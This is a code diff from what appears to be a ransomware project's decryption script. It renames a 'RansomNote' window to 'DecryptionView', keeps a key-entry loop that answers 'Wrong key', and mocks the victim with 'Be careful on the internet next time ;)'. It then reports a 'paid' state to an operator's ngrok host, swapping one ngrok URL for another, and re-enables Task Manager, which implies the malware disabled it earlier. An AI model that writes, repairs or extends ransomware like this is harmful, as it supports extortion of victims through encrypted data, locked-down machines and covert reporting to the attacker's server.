@@ -1,4 +1,4 @@
-from RansomNote import RansomNote, purple_pop_up
+from DecryptionView import DecryptionView, pop_up
 from CryptoManager import CryptoManager
 import os, sys
 
@@ -9,7 +9,7 @@ if __name__ == '__main__':
         print('Nothing to do here')
         sys.exit()
 
-    ransom_note = RansomNote()
+    ransom_note = DecryptionView()
     while True:
         try:
             event, values = ransom_note.note.read()
@@ -30,13 +30,14 @@ if __name__ == '__main__':
 
                 break # salimos del bucle infinito
             else:
-                purple_pop_up(text="Wrong key")
+                pop_up(text="Wrong key")
                 
         except Exception as e:
-            purple_pop_up(text="Wrong key")
+            pop_up(text="Wrong key")
     
     print('All data was successfully decrypted')
-    purple_pop_up(text="All data was decrypted successfully. Be careful on the internet next time ;)")
+    pop_up(text="All data was decrypted successfully. Be careful on the internet next time ;)")
 
-    cm.send_post_request(url='http://4b91c7321c2a.ngrok.io', mode='update', state='paid')
+    # TODO insert id
+    cm.send_post_request(url='http://6e5eca4e96f6.ngrok.io', mode='update', state='paid')
     cm.enable_task_manager()
